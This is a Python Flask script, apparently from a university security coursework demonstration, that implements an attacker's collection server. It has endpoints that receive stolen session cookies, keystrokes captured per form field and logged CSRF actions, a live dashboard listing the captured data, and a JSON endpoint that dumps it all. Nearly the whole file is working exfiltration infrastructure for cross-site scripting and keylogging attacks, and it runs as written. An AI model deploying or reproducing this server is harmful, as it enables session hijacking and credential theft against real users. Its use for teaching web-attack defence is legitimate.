"""
Attacker Server — Keylogger + Cookie Receiver
================================================
EDUCATIONAL PURPOSE ONLY - ELEC0138 Coursework Demonstration
"""

from flask import Flask, request, jsonify, render_template_string, redirect
from datetime import datetime

app = Flask(__name__)

stolen_cookies = []
keylog_entries = []
csrf_logs = []

DASHBOARD_PAGE = """
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Attacker Dashboard</title>
    <style>
        body { font-family: Arial, sans-serif; background: #1e293b; color: #e2e8f0; padding: 32px; }
        .container { max-width: 1000px; margin: 0 auto; }
        h1 { color: #f87171; margin-bottom: 6px; }
        h2 { color: #fbbf24; margin-top: 28px; margin-bottom: 12px; }
        .subtitle { color: #94a3b8; margin-bottom: 24px; }
        .grid { display: grid; grid-template-columns: repeat(auto-fit, minmax(180px, 1fr)); gap: 14px; margin-bottom: 24px; }
        .stat { background: #334155; border-radius: 12px; padding: 18px; text-align: center; }
        .stat .label { color: #94a3b8; font-size: 13px; margin-bottom: 6px; }
        .stat .count { font-size: 36px; font-weight: bold; color: #f87171; }
        .card { background: #334155; border-radius: 12px; padding: 16px; margin-bottom: 12px; }
        .label { color: #94a3b8; font-size: 13px; margin-bottom: 6px; }
        .value { color: #fbbf24; font-family: monospace; word-break: break-all; font-size: 14px; }
        .meta { color: #64748b; font-size: 12px; margin-top: 8px; }
        .empty { color: #64748b; font-style: italic; }
        .tag { display: inline-block; padding: 3px 8px; border-radius: 6px; font-size: 11px; font-weight: bold; margin-right: 6px; }
        .tag-cookie { background: #7c3aed; color: white; }
        .tag-key { background: #ea580c; color: white; }
        .tag-csrf { background: #dc2626; color: white; }
        .clear { display: inline-block; margin-top: 16px; color: #94a3b8; text-decoration: none;
                 border: 1px solid #475569; padding: 8px 14px; border-radius: 8px; }
    </style>
    <meta http-equiv="refresh" content="3">
</head>
<body>
    <div class="container">
        <h1>Attacker Dashboard</h1>
        <div class="subtitle">Real-time exfiltration monitor — auto-refreshes every 3s</div>

        <div class="grid">
            <div class="stat">
                <div class="label">Stolen Cookies</div>
                <div class="count">{{ cookies | length }}</div>
            </div>
            <div class="stat">
                <div class="label">Keylog Entries</div>
                <div class="count">{{ keylogs | length }}</div>
            </div>
            <div class="stat">
                <div class="label">CSRF Actions</div>
                <div class="count">{{ csrfs | length }}</div>
            </div>
        </div>

        <h2>Keylogger Captures</h2>
        {% if keylogs %}
            {% for k in keylogs | reverse %}
            <div class="card">
                <span class="tag tag-key">KEYLOG</span>
                <div class="label">Field: {{ k.field }}</div>
                <div class="value">{{ k.data }}</div>
                <div class="meta">IP: {{ k.ip }} | Time: {{ k.time }}</div>
            </div>
            {% endfor %}
        {% else %}
            <div class="empty">No keystrokes captured yet.</div>
        {% endif %}

        <h2>Stolen Cookies</h2>
        {% if cookies %}
            {% for s in cookies | reverse %}
            <div class="card">
                <span class="tag tag-cookie">COOKIE</span>
                <div class="value">{{ s.cookie }}</div>
                <div class="meta">IP: {{ s.ip }} | UA: {{ s.user_agent[:60] }}... | Time: {{ s.time }}</div>
            </div>
            {% endfor %}
        {% else %}
            <div class="empty">No cookies stolen yet.</div>
        {% endif %}

        <h2>CSRF / Session Riding Actions</h2>
        {% if csrfs %}
            {% for c in csrfs | reverse %}
            <div class="card">
                <span class="tag tag-csrf">CSRF</span>
                <div class="label">Action: {{ c.action }}</div>
                <div class="value">{{ c.detail }}</div>
                <div class="meta">IP: {{ c.ip }} | Time: {{ c.time }}</div>
            </div>
            {% endfor %}
        {% else %}
            <div class="empty">No CSRF actions logged yet.</div>
        {% endif %}

        <a class="clear" href="/clear">Clear all data</a>
    </div>
</body>
</html>
"""


@app.route("/steal")
def steal():
    cookie = request.args.get("c", "").strip()

    if "session=" in cookie:
        stolen_cookies.append({
            "cookie": cookie,
            "ip": request.remote_addr,
            "user_agent": request.headers.get("User-Agent", ""),
            "time": datetime.now().strftime("%H:%M:%S"),
        })
        print(f"  [COOKIE] {cookie[:60]}...")

    return "", 204


@app.route("/keys")
def keys():
    field = request.args.get("field", "unknown")
    data = request.args.get("data", "").strip()
    if data:
        keylog_entries.append({
            "field": field,
            "data": data,
            "ip": request.remote_addr,
            "time": datetime.now().strftime("%H:%M:%S"),
        })
        print(f"  [KEYLOG] {field}: {data}")
    return "", 204


@app.route("/csrf-log")
def csrf_log():
    action = request.args.get("action", "").strip()
    detail = request.args.get("detail", "").strip()

    if action or detail:
        csrf_logs.append({
            "action": action,
            "detail": detail,
            "ip": request.remote_addr,
            "time": datetime.now().strftime("%H:%M:%S"),
        })
        print(f"  [CSRF] {action}: {detail}")

    return "", 204


@app.route("/")
def dashboard():
    return render_template_string(
        DASHBOARD_PAGE,
        cookies=stolen_cookies,
        keylogs=keylog_entries,
        csrfs=csrf_logs,
    )


@app.route("/api/all")
def api_all():
    return jsonify({
        "cookies": stolen_cookies,
        "keylogs": keylog_entries,
        "csrf_logs": csrf_logs,
    })


@app.route("/clear")
def clear():
    stolen_cookies.clear()
    keylog_entries.clear()
    csrf_logs.clear()
    return redirect("/")


if __name__ == "__main__":
    print("=" * 60)
    print("  ATTACKER SERVER — Cookie + Keylogger + CSRF Monitor")
    print("  Dashboard:  http://127.0.0.1:8888")
    print("=" * 60)
    print()
    app.run(host="0.0.0.0", port=8888, debug=False)